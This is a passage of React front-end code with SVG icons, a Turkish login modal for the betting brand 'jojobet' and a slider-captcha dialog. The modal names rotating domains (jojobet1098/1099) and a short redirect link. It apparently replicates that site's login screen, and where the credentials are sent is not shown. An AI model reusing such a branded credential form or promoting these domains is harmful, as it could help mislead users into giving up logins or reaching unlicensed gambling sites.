16.9715 24.15V22.5435C16.9698 22.5268 16.9622 22.5112 16.95 22.4996C16.9378 22.488 16.9218 22.4813 16.905 22.4805H15.3125C15.2957 22.4813 15.2797 22.488 15.2675 22.4996C15.2553 22.5112 15.2477 22.5268 15.246 22.5435Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M15.3125 28.0875C15.2462 28.088 15.1804 28.0753 15.1191 28.0501C15.0577 28.0249 15.002 27.9878 14.9551 27.9409C14.9082 27.894 14.8711 27.8383 14.8459 27.7769C14.8208 27.7156 14.808 27.6498 14.8085 27.5835V25.991C14.808 25.9247 14.8208 25.8589 14.8459 25.7976C14.8711 25.7362 14.9082 25.6805 14.9551 25.6336C15.002 25.5867 15.0577 25.5496 15.1191 25.5244C15.1804 25.4993 15.2462 25.4865 15.3125 25.487H16.905C16.9713 25.4865 17.0371 25.4993 17.0984 25.5244C17.1598 25.5496 17.2155 25.5867 17.2624 25.6336C17.3093 25.6805 17.3464 25.7362 17.3716 25.7976C17.3968 25.8589 17.4095 25.9247 17.409 25.991V27.5835C17.4095 27.6498 17.3968 27.7156 17.3716 27.7769C17.3464 27.8383 17.3093 27.894 17.2624 27.9409C17.2155 27.9878 17.1598 28.0249 17.0984 28.0501C17.0371 28.0753 16.9713 28.088 16.905 28.0875H15.3125ZM15.246 25.9875V27.58C15.2469 27.5974 15.2541 27.6138 15.2664 27.6261C15.2787 27.6384 15.2952 27.6457 15.3125 27.6465H16.905C16.9224 27.6457 16.9388 27.6384 16.9511 27.6261C16.9634 27.6138 16.9707 27.5974 16.9715 27.58V25.991C16.9707 25.9736 16.9634 25.9572 16.9511 25.9449C16.9388 25.9326 16.9224 25.9254 16.905 25.9245H15.3125C15.2952 25.9254 15.2787 25.9326 15.2664 25.9449C15.2541 25.9572 15.2469 25.9736 15.246 25.991V25.9875Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M17.85 13.083C17.819 13.0869 17.7874 13.0842 17.7575 13.075C17.7276 13.0658 17.7 13.0504 17.6765 13.0297C17.653 13.009 17.6342 12.9835 17.6213 12.955C17.6084 12.9265 17.6018 12.8955 17.6018 12.8642C17.6018 12.8329 17.6084 12.802 17.6213 12.7735C17.6342 12.745 17.653 12.7195 17.6765 12.6988C17.7 12.6781 17.7276 12.6627 17.7575 12.6535C17.7874 12.6443 17.819 12.6416 17.85 12.6455H25.1335C25.1868 12.6522 25.2357 12.6782 25.2712 12.7185C25.3067 12.7587 25.3263 12.8106 25.3263 12.8642C25.3263 12.9179 25.3067 12.9698 25.2712 13.01C25.2357 13.0503 25.1868 13.0762 25.1335 13.083H17.85Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M15.267 13.083H15.883C15.9363 13.0763 15.9852 13.0503 16.0207 13.01C16.0562 12.9698 16.0758 12.9179 16.0758 12.8643C16.0758 12.8106 16.0562 12.7587 16.0207 12.7185C15.9852 12.6782 15.9363 12.6523 15.883 12.6455H15.267V13.083Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M29.5365 12.6455H27.0865C27.0555 12.6416 27.0239 12.6443 26.994 12.6535C26.9641 12.6627 26.9365 12.6781 26.913 12.6988C26.8895 12.7195 26.8707 12.745 26.8578 12.7735C26.845 12.802 26.8383 12.8329 26.8383 12.8642C26.8383 12.8955 26.845 12.9265 26.8578 12.955C26.8707 12.9835 26.8895 13.009 26.913 13.0297C26.9365 13.0504 26.9641 13.0658 26.994 13.075C27.0239 13.0842 27.0555 13.0869 27.0865 13.083H29.5365C29.5724 13.083 29.6079 13.09 29.641 13.1038C29.6741 13.1175 29.7042 13.1376 29.7296 13.1629C29.7549 13.1883 29.775 13.2184 29.7887 13.2515C29.8025 13.2846 29.8095 13.3201 29.8095 13.356V16.394H13.153V15.4H12.7155V16.611C12.717 16.6683 12.7394 16.7231 12.7785 16.765C12.8202 16.8071 12.8768 16.831 12.936 16.8315H30.03C30.0588 16.8314 30.0874 16.8254 30.1138 16.814C30.1403 16.8026 30.1642 16.7859 30.184 16.765C30.2045 16.745 30.2206 16.721 30.2314 16.6945C30.2422 16.668 30.2476 16.6396 30.247 16.611V13.356C30.2484 13.2623 30.231 13.1693 30.1958 13.0824C30.1606 12.9956 30.1083 12.9167 30.0421 12.8504C29.9758 12.7842 29.8969 12.7319 29.8101 12.6967C29.7232 12.6615 29.6302 12.6441 29.5365 12.6455Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M8.42383 12.4595L13.4525 14.6398C13.5855 14.6975 13.7401 14.6364 13.7978 14.5034L16.7062 7.79523C16.7639 7.66222 16.7028 7.50764 16.5698 7.44997L11.5411 5.26969C11.4081 5.21202 11.2535 5.2731 11.1958 5.40611L8.28741 12.1142C8.22974 12.2473 8.29082 12.4018 8.42383 12.4595Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M7.32201 7.73151L4.87201 8.34051C4.80518 8.36 4.74883 8.40524 4.71535 8.46629C4.68188 8.52733 4.67402 8.59917 4.69351 8.66601L6.68151 15.701C6.7003 15.7677 6.7447 15.8243 6.80502 15.8584C6.86533 15.8924 6.93669 15.9013 7.00351 15.883L12.649 14.3815"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M10.7555 5.97798L7.62301 5.90798C7.55398 5.90704 7.48736 5.93332 7.43757 5.98114C7.38778 6.02897 7.35884 6.09448 7.35701 6.16348L7.19251 13.475C7.1911 13.5096 7.19664 13.5441 7.20881 13.5765C7.22097 13.6089 7.23951 13.6386 7.26333 13.6637C7.28715 13.6888 7.31577 13.7089 7.34749 13.7228C7.37921 13.7367 7.41339 13.744 7.44801 13.7445L11.6235 13.839"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M12.3655 11.9C12.1942 11.7639 12.0088 11.6466 11.8125 11.55C11.6039 11.4759 11.3881 11.4243 11.1685 11.396"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M12.1625 10.724C11.9963 10.7489 11.8265 10.7354 11.6663 10.6844C11.5061 10.6334 11.3598 10.5464 11.2385 10.43C11.1289 10.3089 11.0586 10.1575 11.0367 9.99572C11.0149 9.83392 11.0425 9.66928 11.116 9.52348C11.403 8.86898 12.775 8.91448 13.118 8.51898C13.0655 9.04048 14.0385 10.01 13.7515 10.668C13.6975 10.8222 13.5973 10.956 13.4646 11.0512C13.3318 11.1464 13.1729 11.1984 13.0095 11.2C12.8411 11.1917 12.6769 11.1443 12.53 11.0617C12.383 10.9791 12.2572 10.8635 12.1625 10.724Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
</svg>

  )

  const bahiskurallar = (
    <svg
  width={36}
  height={35}
  viewBox="0 0 36 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[34.99px] h-[34.86px] relative"
  preserveAspectRatio="none"
>
  <path d="M34.8506 0.0032959H0V34.8539H34.8506V0.0032959Z" fill="white" />
  <path
    d="M29.9541 22.008V29.2778H4.18207V5.48877H29.9541V14.0794"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M4.18207 9.45477H29.9541"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M6.16516 7.47192H7.48608"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M8.14807 7.47174H9.46899"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M14.094 12.0964H6.82373V20.0254H14.094V12.0964Z"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M6.16504 23.3288H14.7563"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M6.16504 25.9739H14.7563"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.7388 25.9739H24.0056"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.7388 23.3288H24.0056"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.7388 12.7586H24.0056"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.7388 15.4003H21.3637"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M23.3464 17.3836L27.3092 21.3499L34.5795 12.0964"
    stroke="#2A421C"
    strokeWidth="1.04552"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
</svg>

  )

  const hesapozetim = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
    d="M14.609 7.95203H26.495V30.1H9.20502V7.95203H13.5275"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M16.2295 11.2H23.2505C23.3216 11.1986 23.3922 11.2113 23.4584 11.2373C23.5246 11.2633 23.5849 11.3022 23.636 11.3516C23.6871 11.4011 23.7278 11.4602 23.756 11.5254C23.7842 11.5907 23.7991 11.6609 23.8 11.732V19.2955C23.8 19.3666 23.786 19.4369 23.7587 19.5026C23.7314 19.5682 23.6913 19.6278 23.6409 19.6779C23.5905 19.728 23.5307 19.7676 23.4649 19.7945C23.3991 19.8214 23.3286 19.835 23.2575 19.8345H12.4495C12.3779 19.8359 12.3066 19.823 12.24 19.7965C12.1734 19.7701 12.1128 19.7306 12.0616 19.6804C12.0104 19.6302 11.9698 19.5703 11.942 19.5042C11.9143 19.4381 11.9 19.3672 11.9 19.2955V13.895"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M12.4495 24.6995H23.2505"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M12.4495 22.5365H23.2505"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M12.4495 26.859H17.85"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M15.6905 18.7565C15.6905 18.4729 15.7463 18.1921 15.8549 17.9301C15.9634 17.6681 16.1225 17.43 16.323 17.2295C16.5235 17.029 16.7616 16.8699 17.0236 16.7614C17.2856 16.6528 17.5664 16.597 17.85 16.597C18.1336 16.597 18.4144 16.6528 18.6764 16.7614C18.9384 16.8699 19.1765 17.029 19.377 17.2295C19.5775 17.43 19.7366 17.6681 19.8451 17.9301C19.9536 18.1921 20.0095 18.4729 20.0095 18.7565"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M17.85 16.5935C18.745 16.5935 19.4705 15.868 19.4705 14.973C19.4705 14.078 18.745 13.3525 17.85 13.3525C16.955 13.3525 16.2295 14.078 16.2295 14.973C16.2295 15.868 16.955 16.5935 17.85 16.5935Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M11.9 9.5725V11.2C11.9 11.4868 12.014 11.7619 12.2168 11.9647C12.4196 12.1676 12.6947 12.2815 12.9815 12.2815H13.5205C13.6632 12.2824 13.8045 12.2551 13.9366 12.2012C14.0686 12.1473 14.1886 12.0677 14.2898 11.9672C14.391 11.8667 14.4713 11.7472 14.5261 11.6155C14.5808 11.4838 14.609 11.3426 14.609 11.2V6.3315C14.609 6.04467 14.4951 5.76958 14.2923 5.56676C14.0895 5.36394 13.8144 5.25 13.5275 5.25H12.4495C12.1627 5.25 11.8876 5.36394 11.6848 5.56676C11.482 5.76958 11.368 6.04467 11.368 6.3315V7.952"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
</svg>

  )

  const numaraguncelle = (
    <svg
    width={35}
    height={44}
    viewBox="0 0 35 44"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
    className="w-[35px] h-[43.75px] relative"
    preserveAspectRatio="none"
  >
    <path
      d="M16.8778 3.11108H6.84444C5.56111 3.11108 4.51111 4.16108 4.51111 5.44442V26.4055C4.51111 27.6889 5.56111 28.7389 6.84444 28.7389H14.3889V24.3444H7.27222C6.80555 24.3444 6.41666 23.9555 6.41666 23.4889V5.98886C6.41666 5.52219 6.80555 5.13331 7.27222 5.13331H16.45C16.9167 5.13331 17.3056 5.52219 17.3056 5.98886V13.3389C17.6556 13.2222 18.0444 13.1833 18.4333 13.1833H19.2111V5.44442C19.2111 4.16108 18.1611 3.11108 16.8778 3.11108ZM11.8611 25.6278C12.4444 25.6278 12.8722 26.0944 12.8722 26.6389C12.8722 27.2222 12.4056 27.65 11.8611 27.65C11.2778 27.65 10.85 27.1833 10.85 26.6389C10.85 26.0944 11.3167 25.6278 11.8611 25.6278Z"
      fill="#294C0B"
    />
    <path
      d="M28.4667 14.8944H18.4333C17.15 14.8944 16.1 15.9444 16.1 17.2278V38.1889C16.1 39.4722 17.15 40.5222 18.4333 40.5222H28.4667C29.75 40.5222 30.8 39.4722 30.8 38.1889V17.2278C30.8 15.9444 29.7889 14.8944 28.4667 14.8944ZM23.4889 39.4333C22.9055 39.4333 22.4778 38.9667 22.4778 38.4222C22.4778 37.8389 22.9444 37.4111 23.4889 37.4111C24.0333 37.4111 24.5 37.8778 24.5 38.4222C24.5 39.0055 24.0333 39.4333 23.4889 39.4333ZM28.9333 35.2722C28.9333 35.7389 28.5444 36.1278 28.0778 36.1278H18.8611C18.3944 36.1278 18.0055 35.7389 18.0055 35.2722V17.7722C18.0055 17.3055 18.3944 16.9167 18.8611 16.9167H28.0389C28.5055 16.9167 28.8944 17.3055 28.8944 17.7722V35.2722H28.9333ZM28.8555 7.62221C26.4833 3.1111 21 2.29443 21 2.29443C23.8389 4.54999 24.6167 7.93332 24.8111 9.09999L23.0222 9.7611L28.3889 12.2111L30.8389 6.84443L28.8555 7.62221ZM14.5055 41.4555C11.5889 39.3167 10.6555 35.9722 10.4222 34.8055L12.2111 34.0667L6.76665 31.85L4.54999 37.2944L6.45554 36.4778C9.02221 40.8722 14.5055 41.4555 14.5055 41.4555Z"
      fill="#294C0B"
    />
  </svg>
  )
  





  return (
    <>
      {/* --- LOGIN MODAL --- */}
      {isMobile ? (
        // MOBILE VERSION
        <div 
          className={`fixed inset-0 z-[100] flex items-center justify-center transition-opacity duration-400 ${
            showLoginModal 
              ? 'opacity-100 pointer-events-auto' 
              : 'opacity-0 pointer-events-none'
          }`}
          onClick={(e) => {
            if (e.target === e.currentTarget && showLoginModal) {
              setShowLoginModal(false)
            }
          }}
        >
          <div 
            className={`bg-[#202123]/70 backdrop-blur-xs transition-opacity duration-400 absolute inset-0 ${
              showLoginModal ? 'opacity-100' : 'opacity-0'
            }`}
          />
          <div 
            className={`bg-transparent shadow-2xl fixed inset-0 flex flex-col overflow-y-auto transition-all duration-400 ${
              showLoginModal 
                ? 'opacity-100 translate-y-0' 
                : 'opacity-0 -translate-y-8'
            }`}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Main Card Container */}
            <div className="w-full max-w-md bg-transparent overflow-hidden relative mx-auto min-h-full flex flex-col">
              {/* Header Section */}
              <div className="bg-transparent px-6 pt-[14px] text-center relative flex-shrink-0">
                {/* Close Button */}
                <button 
                  onClick={() => setShowLoginModal(false)}
                  disabled={isLoggingIn}
                  className="absolute cursor-pointer  top-4 right-4 bg-black/20 hover:bg-black/30 text-white rounded-full px-3 py-1 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  x
                </button>

                <h1 className="text-white text-xl font-bold mb-1">Hoşgeldiniz</h1>
              </div>

              {/* Body Section */}
              <div className="px-6 pt-13 pb-6 flex-1 overflow-y-auto">
                {/* Username/Email Input */}
                <div className="mb-6">
                  <label className="block text-white text-xs mb-2 font-medium">
                    <span className="text-red-600 mr-0.5">*</span>Kullanıcı adınız veya Email Adresiniz
                  </label>
                  <input 
                    type="text" 
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Lütfen Kullanıcı Adınızı veya Email Adresinizi girin"
                    className="w-full px-4 mt-2 py-2 bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder:text-sm placeholder-gray-400"
                    disabled={isLoggingIn}
                  />
                </div>

                {/* Password Input */}
                <div className="mb-8">
                  <label className="block text-white text-xs mb-2 font-medium">
                    <span className="text-red-600 mr-0.5">*</span>Şifre
                  </label>
                  <div className="relative">
                    <input 
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Lütfen şifrenizi girin."
                      className="w-full px-4 py-2 mt-2 placeholder:text-sm bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400 pr-10"
                      disabled={isLoggingIn}
                    />
                    <button 
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-600 hover:text-gray-800 focus:outline-none"
                    >
                      <Eye size={20} />
                    </button>
                  </div>
                </div>

                {/* Info Text */}
                <div className="mb-6 text-xs  mt-2 text-white leading-relaxed">
                  <p>
                    Güncel adresimiz <span className="font-bold">www.jojobet1098.com</span>'dur. Bir sonraki güncellemede adresimiz <span className="font-bold">www.jojobet1099.com</span> olacaktır. Her zaman güncel adres için: <a href="#" className="text-[#eecf54] hover:underline">https://dub.run/jojoguncel</a> yazıp giriş yapabilirsiniz!
                  </p>
                </div>

                {/* Social Icons */}
                <div className="flex gap-3 mb-8 justify-start">
                  {/* X (Twitter) Icon */}
                  <a href="#" className="w-10 h-10 bg-black rounded-full flex items-center justify-center text-white hover:opacity-80 transition-opacity">
                    <svg viewBox="0 0 24 24" aria-hidden="true" className="w-5 h-5 fill-current"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
                  </a>
                  
                  {/* Telegram Icon */}
                  <a href="#" className="w-10 h-10 bg-[#37aee2] rounded-full flex items-center justify-center text-white hover:opacity-80 transition-opacity pl-0.5 pt-0.5">
                    <svg viewBox="0 0 24 24" className="w-5 h-5 fill-current" xmlns="http://www.w3.org/2000/svg"><path d="M21.929 2.613a1.996 1.996 0 0 0-1.944.12L2.56 11.533a1.995 1.995 0 0 0 .11 3.652l4.496 1.445 1.53 4.956a1.996 1.996 0 0 0 3.479.51L14.5 19.27l4.89 3.644a2.005 2.005 0 0 0 3.232-1.243l3.375-17.5a2 2 0 0 0-2.068-2.558ZM12.014 13.4l-1.148 4.785-.65-3.85L20.33 5.45 12.014 13.4Z"></path></svg>
                  </a>
                </div>

                {/* Buttons */}
                <div className="space-y-4">
                  <button 
                    onClick={handleLogin}
                    disabled={isLoggingIn || isLoadingCaptcha}
                    className="w-full h-[42px] bg-[#f4c91c] hover:bg-[#e4c448] cursor-pointer disabled:cursor-not-allowed text-gray-900 font-medium rounded-[4px] transition-colors shadow-sm text-base flex items-center justify-center gap-4"
                  >
                    {isLoadingCaptcha ? (
                      <div className="flex items-center gap-4 h-full">
                        <div className="w-2 h-2 bg-[#1a1a1a] rounded-md animate-[wave_2s_ease-in-out_infinite]"></div>
                        <div className="w-2 h-2 bg-[#1a1a1a] rounded-md animate-[wave_2s_ease-in-out_0.4s_infinite]"></div>
                        <div className="w-2 h-2 bg-[#1a1a1a] rounded-md animate-[wave_2s_ease-in-out_0.8s_infinite]"></div>
                        <div className="w-2 h-2 bg-[#1a1a1a] rounded-md animate-[wave_2s_ease-in-out_1.2s_infinite]"></div>
                      </div>
                    ) : (
                      'Giriş Yap' 
                    )}
                  </button>
                  
                  {/* Kayıt Ol Button - Mobile Only */}
                  <button 
                    className="w-full bg-transparent border text-sm border-[#ffffffb9]  text-[#ffffffb9] font-medium py-2.5 rounded-[6px] transition-colors hover:bg-white/10"
                  >
                    Şimdi Kayıt Olun
                  </button>
                  
                  <div className="text-center">
                    <button className="text-[#eecf54] text-sm hover:underline font-medium">
                      Şifremi Unuttum
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : (
        // WEB VERSION
        <div 
          className={`fixed inset-0 z-[100] flex items-center justify-center transition-opacity duration-400 ${
            showLoginModal 
              ? 'opacity-100 pointer-events-auto' 
              : 'opacity-0 pointer-events-none'
          }`}
          onClick={(e) => {
            if (e.target === e.currentTarget && showLoginModal) {
              setShowLoginModal(false)
            }
          }}
        >
          <div 
            className={`bg-gray-600/40 transition-opacity duration-400 absolute inset-0 ${
              showLoginModal ? 'opacity-100' : 'opacity-0'
            }`}
          />
          <div 
            className={`bg-white shadow-2xl w-[364px] h-auto flex flex-col relative overflow-hidden transition-all duration-400 ${
              showLoginModal 
                ? 'opacity-100 translate-y-0' 
                : 'opacity-0 -translate-y-8'
            }`}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Main Card Container */}
            <div className="w-full max-w-md bg-white shadow-xl overflow-hidden relative">
              {/* Header Section */}
              <div className="bg-[#294c0b] px-6 py-6 text-center relative">
                {/* Close Button */}
                <button 
                  onClick={() => setShowLoginModal(false)}
                  disabled={isLoggingIn}
                  className="absolute cursor-pointer top-4 right-4 bg-black/20 hover:bg-black/30 text-white rounded-full px-2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  x
                </button>

                <h1 className="text-white text-2xl font-bold mb-1">Hoşgeldiniz</h1>
                <p className="text-sm text-gray-300">
                  Henüz hesabınız yok mu? <span className="text-[#f4d03f] cursor-pointer hover:underline">Şimdi Kayıt Olun</span>
                </p>
              </div>

              {/* Body Section */}
              <div className="p-6 pt-8">
                {/* Username/Email Input */}
                <div className="mb-6">
                  <label className="block text-gray-800 text-sm mb-2 font-medium">
                    <span className="text-red-600 mr-0.5">*</span>Kullanıcı adınız veya Email Adresiniz
                  </label>
                  <input 
                    type="text" 
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Lütfen Kullanıcı Adınızı veya Email Adresinizi girin"
                    className="w-full px-4 py-3 border border-gray-300 rounded-[4px] text-gray-700 text-sm focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400"
                    disabled={isLoggingIn}
                  />
                </div>

                {/* Password Input */}
                <div className="mb-8">
                  <label className="block text-gray-800 text-sm mb-2 font-medium">
                    <span className="text-red-600 mr-0.5">*</span>Şifre
                  </label>
                  <div className="relative">
                    <input 
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Lütfen şifrenizi girin."
                      className="w-full px-4 py-3 border border-gray-300 rounded-[4px] text-gray-700 text-sm focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400 pr-10"
                      disabled={isLoggingIn}
                    />
                    <button 
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-600 hover:text-gray-800 focus:outline-none"
                    >
                      <Eye size={20} />
                    </button>
                  </div>
                </div>

                {/* Info Text */}
                <div className="mb-6 text-sm text-gray-800 leading-relaxed">
                  <p>
                    Güncel adresimiz <span className="font-bold">www.jojobet1098.com</span>'dur. Bir sonraki güncellemede adresimiz <span className="font-bold">www.jojobet1099.com</span> olacaktır. Her zaman güncel adres için: <a href="#" className="text-[#eecf54] hover:underline">https://dub.run/jojoguncel</a> yazıp giriş yapabilirsiniz!
                  </p>
                </div>

                {/* Social Icons */}
                <div className="flex gap-3 mb-8">
                  {/* X (Twitter) Icon */}
                  <a href="#" className="w-10 h-10 bg-black rounded-full flex items-center justify-center text-white hover:opacity-80 transition-opacity">
                    <svg viewBox="0 0 24 24" aria-hidden="true" className="w-5 h-5 fill-current"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
                  </a>
                  
                  {/* Telegram Icon */}
                  <a href="#" className="w-10 h-10 bg-[#37aee2] rounded-full flex items-center justify-center text-white hover:opacity-80 transition-opacity pl-0.5 pt-0.5">
                    <svg viewBox="0 0 24 24" className="w-5 h-5 fill-current" xmlns="http://www.w3.org/2000/svg"><path d="M21.929 2.613a1.996 1.996 0 0 0-1.944.12L2.56 11.533a1.995 1.995 0 0 0 .11 3.652l4.496 1.445 1.53 4.956a1.996 1.996 0 0 0 3.479.51L14.5 19.27l4.89 3.644a2.005 2.005 0 0 0 3.232-1.243l3.375-17.5a2 2 0 0 0-2.068-2.558ZM12.014 13.4l-1.148 4.785-.65-3.85L20.33 5.45 12.014 13.4Z"></path></svg>
                  </a>
                </div>

                {/* Buttons */}
                <div className="space-y-4">
                  <button 
                    onClick={handleLogin}
                    disabled={isLoggingIn || isLoadingCaptcha}
                    className="w-full bg-[#f4c91c] hover:bg-[#e4c448] cursor-pointer disabled:bg-gray-400 disabled:cursor-not-allowed text-gray-900 font-medium py-3.5 rounded-[4px] transition-colors shadow-sm text-base flex items-center justify-center gap-2"
                  >
                    {isLoadingCaptcha ? (
                      <>
                        <svg className="animate-spin h-5 w-5 text-gray-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Yükleniyor...
                      </>
                    ) : (
                      'Giriş Yap' 
                    )}
                  </button>
                  
                  <div className="text-center">
                    <button className="text-[#eecf54] text-sm hover:underline font-medium">
                      Şifremi Unuttum
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* --- CAPTCHA PUZZLE MODAL ] --- */}
      <div 
        className={`fixed inset-0 z-[101] flex items-center justify-center transition-opacity duration-400 ${
          showCaptcha 
            ? 'opacity-100 pointer-events-auto' 
            : 'opacity-0 pointer-events-none'
        }`}
      >
        <div 
          className={`bg-gray-800/60 transition-opacity duration-400 absolute inset-0 ${
            showCaptcha ? 'opacity-100' : 'opacity-0'
          }`}
        />
        <div 
          className={`bg-white shadow-2xl md:w-[400px] w-[96vw] h-auto flex flex-col relative overflow-hidden transition-all duration-400 rounded-lg ${
            showCaptcha 
              ? 'opacity-100 translate-y-0' 
              : 'opacity-0 -translate-y-8'
          }`}
        >
          {/* Header */}
          <div className="bg-[#294c0b] px-6 py-4 text-center relative">
            <h2 className="text-white text-xl font-bold">Güvenlik Doğrulaması</h2>
            <p className="text-sm text-gray-300 mt-1">Lütfen puzzle'ı tamamlayın</p>
          </div>

          {/* Puzzle Area */}
          <div className="p-6">
            <PuzzleCaptcha 
              sliderPosition={sliderPosition}
              targetPosition={targetPosition}
              captchaCompleted={captchaCompleted}
              isDragging={isDragging}
              sliderContainerRef={sliderContainerRef}
              handleSliderMouseDown={handleSliderMouseDown}
              handleSliderTouchStart={handleSliderTouchStart}
            />

            {/* Action Buttons */}
            <div className="flex gap-3 mt-3">
              <button 
                onClick={() => {
                  setShowCaptcha(false)
                  setSliderPosition(0)
                  setCaptchaCompleted(false)
                }}
                className="flex-1 bg-gray-300 hover:bg-gray-400 text-gray-800 font-medium py-3 rounded-lg transition-colors"
              >
                İptal
              </button>
              <button 
                onClick={handleCompleteCaptcha}
                disabled={!captchaCompleted}
                className={`flex-1 font-medium py-3 rounded-lg transition-all duration-300 flex items-center justify-center gap-2 ${
                  captchaCompleted
